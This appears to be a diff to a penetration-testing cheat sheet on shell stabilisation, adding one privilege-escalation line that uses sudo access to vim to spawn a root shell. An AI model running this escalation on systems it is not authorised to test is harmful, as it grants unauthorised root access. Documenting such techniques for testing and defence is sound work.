@@ -66,5 +66,8 @@ SHELL=/bin/bash script -q /dev/null
 export TERM=xterm-256color
 
 #Switch to the background with CTRL+Z
+
+# If sudo -l in user has access to /usr/bin/vim
+sudo vim -c ":!/bin/sh"
 ```
 <br/>
